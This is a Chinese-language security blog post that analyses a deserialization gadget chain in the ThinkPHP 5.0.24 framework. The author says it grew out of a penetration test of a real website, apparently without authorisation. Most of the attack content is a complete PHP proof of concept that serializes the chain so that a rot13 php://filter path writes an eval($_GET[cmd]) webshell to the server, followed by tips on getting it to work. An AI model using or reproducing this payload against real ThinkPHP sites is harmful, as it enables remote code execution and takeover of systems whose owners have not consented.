<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="tp5.0.24反序列化漏洞分析"/>




  <meta name="keywords" content="thinkphp," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/03/14/tp5-0-24反序列化漏洞复现/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="tp5.0.24反序列化漏洞分析">
<meta property="og:url" content="https://glotozz.github.io/2020/03/14/tp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg">
<meta property="og:image" content="https://i.loli.net/2020/03/14/drmzkZqfP7DBOnJ.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/6iM7xngRkA1tlLr.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/DMLVtPs4Q9GEXZw.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/ZIf8UpugRHeCY1a.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/UsBeTQOKWCNMjlG.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/bko59EivacK7UtJ.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/7uKqDs4cHNSOTWw.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/OIpzMkgYD3Q5oj6.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/aiepQ1KnlgP37hY.png">
<meta property="og:image" content="https://i.loli.net/2020/03/20/cPV3HLBM87qTN9J.png">
<meta property="og:image" content="https://i.loli.net/2020/03/20/UJYxPuz9qm67C3s.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/NzSUCXLmsnokd3M.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/rULQdsDTb76wjOt.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/SNeJLY7y8pCgTO6.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/ztfFGrsTwjCgvaP.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/HJNUvzR4hWtQPp3.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/RpmWuG6dxt8qBbY.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/FKEx35yhpIvTH47.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/uUqmTejCLaSrbZN.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/urnULvks7XPNgGa.png">
<meta property="og:image" content="https://i.loli.net/2020/03/15/xDKSGHs7kv4Jcgb.png">
<meta property="article:published_time" content="2020-03-13T23:21:02.000Z">
<meta property="article:modified_time" content="2020-03-20T13:39:22.494Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="thinkphp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> tp5.0.24反序列化漏洞分析 - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          tp5.0.24反序列化漏洞分析
        
      </h1>

      <time class="post-time">
          Mar 14 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#一-获取漏洞">一、获取漏洞</a></li>
<li><a href="#二-漏洞分析">二、漏洞分析</a></li>
<li><a href="#三-poc编写">三、POC编写</a></li>
<li><a href="#参考链接">参考链接：</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>昨夜对一h网进行渗透测试，该网站是基于tp5.0.24二次开发的，就想着自己也分析一下（主要是没给poc哈哈），力哥挖的嗷😁</p>
<p><img src="https://i.loli.net/2020/03/14/q3uEdmxMWGIDnzS.jpg" alt="TIM图片20200314072347.jpg"></p>
<h4><span id="一-获取漏洞">一、获取漏洞</span></h4><blockquote>
<p><a href="http://www.thinkphp.cn/donate/download/id/1279.html" target="_blank" rel="noopener">http://www.thinkphp.cn/donate/download/id/1279.html</a> </p>
</blockquote>
<p><code>application/index/controller/Index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">appindexcontroller</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($input=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Welcome thinkphp 5.0.24"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $input;</span><br><span class="line">        unserialize($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/tp5.0.24/public/index.php</code></p>
<h4><span id="二-漏洞分析">二、漏洞分析</span></h4><p>虽然之前自己没有分析过tp5.0.x的反序列化，因为tp5.0.0~tp5.0.23有一条直接RCE的POP链，但是想来也差不多。而tp5.0.24中对传入的<code>_method</code>进行白名单限制，因此无法调用任意类方法。</p>
<p>Thinkphp 5.0.x反序列化最后触发RCE，要调用的<code>Request</code>类<code>__call</code>方法，因此也被限制。</p>
<p><img src="https://i.loli.net/2020/03/14/drmzkZqfP7DBOnJ.png" alt="Snipaste_2020-03-14_07-56-35.png"></p>
<p>需要寻找其他的<code>__call</code>方法，然后力哥找到了下面这里</p>
<p><code>Output.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/6iM7xngRkA1tlLr.png" alt="Snipaste_2020-03-14_08-01-21.png"></p>
<p>追踪<code>block()</code>方法</p>
<p><img src="https://i.loli.net/2020/03/15/DMLVtPs4Q9GEXZw.png" alt="Snipaste_2020-03-14_08-03-35.png"></p>
<p>存在文件写入，可以利用。</p>
<hr>
<p><strong>开始分析POP链</strong></p>
<p>看了下发现tp5.0.x、tp5.1.x、tp5.2.x 反序列化入口点都是一样的</p>
<p><code>thinkphp/library/think/process/pipes/Windows.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/ZIf8UpugRHeCY1a.png" alt="Snipaste_2020-03-14_08-13-36.png"></p>
<p>追踪<code>removeFiles()</code></p>
<p><img src="https://i.loli.net/2020/03/15/UsBeTQOKWCNMjlG.png" alt="Snipaste_2020-03-14_08-14-07.png"></p>
<p>这里的<code>file_exist()</code>触发<code>__toString()</code>，因此可以作为跳板</p>
<p>全局搜索<code>__toString()</code>寻找利用点</p>
<p><code>thinkphp/library/think/Model.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/bko59EivacK7UtJ.png" alt="Snipaste_2020-03-14_08-18-41.png"></p>
<p>追踪<code>toJson()</code></p>
<p><img src="https://i.loli.net/2020/03/15/7uKqDs4cHNSOTWw.png" alt="Snipaste_2020-03-14_08-19-15.png"></p>
<p>追踪<code>toArray()</code></p>
<p><img src="https://i.loli.net/2020/03/15/OIpzMkgYD3Q5oj6.png" alt="Snipaste_2020-03-14_08-28-21.png"></p>
<p>存在这三个动态方法调用，最后只有第三处可行</p>
<p>因为要作为跳板，想办法控制<code>$value</code>和<code>$attr</code></p>
<p><img src="https://i.loli.net/2020/03/15/aiepQ1KnlgP37hY.png" alt="Snipaste_2020-03-14_08-35-20.png"></p>
<p>这里的<code>parseName()</code>是个字符串命名风格转换，基本没啥变化</p>
<p>控制<code>$modelRelation</code>需要在当前类中寻找一个无参方法</p>
<p><img src="https://i.loli.net/2020/03/20/cPV3HLBM87qTN9J.png" alt="Snipaste_2020-03-20_21-35-56.png"></p>
<p>跟进<code>getRelationData()</code></p>
<p><img src="https://i.loli.net/2020/03/20/UJYxPuz9qm67C3s.png" alt="Snipaste_2020-03-20_21-35-37.png"></p>
<p>这个方法说明是获取关联模型数据，需要满足第一个if条件，这里比较麻烦，先看下面。假设满足，返回<code>$this-&gt;parent</code></p>
<p>接下来需要寻找一个有<code>getBindAttr()</code>方法的类，全局搜索发现只有一个<code>OneToOne</code>类</p>
<p><img src="https://i.loli.net/2020/03/15/NzSUCXLmsnokd3M.png" alt="Snipaste_2020-03-14_09-14-38.png"></p>
<p>也是可控的，因为是抽象类，寻找继承<code>OneToOne()</code>的类，并且满足前面那个if条件，最终发现<code>HasOne</code>类可用，具体变量值等下调试看看结果</p>
<p>之后就是利用<code>$value-&gt;getAttr($attr)</code>这个跳板触发<code>Output</code>类中的<code>__call()</code></p>
<p><img src="https://i.loli.net/2020/03/15/rULQdsDTb76wjOt.png" alt="Snipaste_2020-03-14_10-34-42.png"></p>
<p><code>block()</code></p>
<p><img src="https://i.loli.net/2020/03/15/SNeJLY7y8pCgTO6.png" alt="Snipaste_2020-03-14_10-35-00.png"></p>
<p><code>writeln()</code></p>
<p><img src="https://i.loli.net/2020/03/15/ztfFGrsTwjCgvaP.png" alt="Snipaste_2020-03-14_10-35-17.png"></p>
<p><code>write()</code></p>
<p><img src="https://i.loli.net/2020/03/15/HJNUvzR4hWtQPp3.png" alt="Snipaste_2020-03-14_10-35-42.png"></p>
<p><code>$this-&gt;handle</code>可控，可以作为跳板，全局搜索<code>write()</code></p>
<p><code>thinkphp/library/think/session/driver/Memcached.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/RpmWuG6dxt8qBbY.png" alt="Snipaste_2020-03-15_12-44-47.png"></p>
<p>可作为跳板，全局搜索<code>-&gt;set</code></p>
<p><code>thinkphp/library/think/cache/driver/File.php</code></p>
<p><img src="https://i.loli.net/2020/03/15/FKEx35yhpIvTH47.png" alt="Snipaste_2020-03-14_10-40-57.png"></p>
<p><code>$filename</code>可控因此可以用伪协议绕过exit，但是这里的<code>$data</code>根据传参为布尔型，</p>
<p>跟进<code>setTagItem()</code></p>
<p><img src="https://i.loli.net/2020/03/15/uUqmTejCLaSrbZN.png" alt="Snipaste_2020-03-14_10-50-13.png"></p>
<p>这里的<code>$value</code>可控即传入的<code>$name</code>，是前面的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $this-&gt;getCacheKey($name, true);</span><br></pre></td></tr></table></figure>

<p>跟进<code>getCacheKey()</code></p>
<p><img src="https://i.loli.net/2020/03/15/urnULvks7XPNgGa.png" alt="Snipaste_2020-03-14_21-19-29.png"></p>
<p>这里需要利用伪协议<code>php://filter/write=string.rot13/resource=./cuc cucvasb();?&gt;</code>作为文件名，从而实现文件写入</p>
<p>至此，POP链完成</p>
<p>可以参考力哥的POP链图</p>
<h4><span id="三-poc编写">三、POC编写</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;<span class="comment">#Windows</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;<span class="comment">//不使用继承</span></span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];<span class="comment">//触发Model __toString(),Model子类Pivot合适</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;<span class="comment">#Query</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $model;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();<span class="comment">//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;<span class="comment">#Relation</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $selfRelation;</span><br><span class="line">	<span class="keyword">protected</span> $query;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;selfRelation = <span class="keyword">false</span>;<span class="comment">//满足if语句</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query();<span class="comment">//满足if语句</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;<span class="comment">#OneToOne HasOne</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;<span class="comment">//使用了Relation类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;<span class="comment">//需要$selfRelation和$query，使用继承</span></span><br><span class="line">	<span class="keyword">protected</span> $bindAttr = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::__construct();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">'key'</span>,<span class="string">'value'</span>];<span class="comment">//即$bindAttr</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>;<span class="comment">#Driver</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $tag;</span><br><span class="line">	<span class="keyword">protected</span> $options = [];</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;tag = <span class="keyword">true</span>;<span class="comment">//满足if ($this-&gt;tag &amp;&amp; !is_file($filename)) </span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">			<span class="comment">// 'path' =&gt; './demo/',</span></span><br><span class="line">			<span class="string">'path'</span> =&gt; <span class="string">'php://filter/write=string.rot13/resource=./demo/&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;'</span>,</span><br><span class="line">			<span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">			<span class="string">'expire'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">			<span class="string">'cache_subdir'</span> =&gt; <span class="keyword">false</span>,<span class="comment">//if ($this-&gt;options['cache_subdir']) &#123;</span></span><br><span class="line">			<span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">		];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">Driver</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;<span class="comment">//需要$tag以及setTagItem()，使用继承</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;<span class="comment">//因为这里没用到SessionHandler，因此没必要继承</span></span><br><span class="line">	<span class="keyword">protected</span> $handler = <span class="keyword">null</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File();<span class="comment">//$this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $styles = [];</span><br><span class="line">	<span class="keyword">private</span> $handle = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;styles = [<span class="string">'getAttr'</span>];<span class="comment">//满足if (in_array($method, $this-&gt;styles)) </span></span><br><span class="line">    	<span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();<span class="comment">//$this-&gt;handle-&gt;write($messages, $newline, $type);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;<span class="comment">#Model</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $append = [];</span><br><span class="line">	<span class="keyword">protected</span> $error;</span><br><span class="line">	<span class="keyword">public</span> $parent;<span class="comment">//坑点</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;append = [<span class="string">'key'</span>=&gt;<span class="string">'getError'</span>];<span class="comment">//value为$relation,因此为getError</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();<span class="comment">//即$modelRealtion</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();<span class="comment">//即$value</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;<span class="comment">#Pivot</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line">$a = base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">var_dump(unserialize(base64_decode($a)));</span><br></pre></td></tr></table></figure>

<p>有个3个需要注意的地方</p>
<p><strong>一、model子类Pivot中也有该变量parent，属性为public；而基类model的parent为protected</strong></p>
<p>将<code>Model</code>类中的parent设为public，但是对于php版本似乎仍有要求。。<code>php7.3.12</code>失败，测试<code>5.6.40，7.3.8，7.0.33</code>可用</p>
<p><strong>二、Windows下使用<code>php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?&gt;</code>无法正常反序列化，调试发现只能正常初始化Windows类，并且Windows下不支持这种文件名</strong></p>
<p>切换到Linux下</p>
<p><strong>三、如果网站不允许写文件，可以先创建一个755的目录</strong></p>
<p><code>getCacheKey()</code>方法，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">	mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$auto</code>为true，将<code>path</code>设为<code>./demo</code></p>
<p>分析下最后的调用</p>
<p>第一次<code>set(&#39;&lt;getAttr&gt;key&lt;getAttr&gt;&#39;, true, expire=3000)</code></p>
<p>中途调用<code>setTagItem(path+md5(name)+.php)</code></p>
<p>在<code>setTagItem()</code>中第二次<code>set(tag_md5(1), path+md5(name)+.php)</code></p>
<p><code>file_put_contents(path+md5(name)+.php, &lt;?php\n//000000000000\n exit();?&gt;\n+serialize(path+md5(name)+.php))</code></p>
<hr>
<p>注意下<code>?</code>的url编码</p>
<p><img src="https://i.loli.net/2020/03/15/xDKSGHs7kv4Jcgb.png" alt="Snipaste_2020-03-15_13-50-20.png"></p>
<hr>
<h4><span id="参考链接">参考链接：</span></h4><p> <a href="https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364?tdsourcetag=s_pctim_aiomsg#h2-7</a> </p>
<p> <a href="http://pines404.online/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.0.24反序列化链分析/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/?tdsourcetag=s_pctim_aiomsg</a> </p>
<p> <a href="https://xz.aliyun.com/t/7082" target="_blank" rel="noopener">https://xz.aliyun.com/t/7082</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/thinkphp/" rel="tag"><i class="fa fa-tag"></i> thinkphp</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/03/16/awd-1/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">awd-1</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/03/13/FRP%E6%90%AD%E5%BB%BA/">
        <span class="next-text nav-default">FRP搭建</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
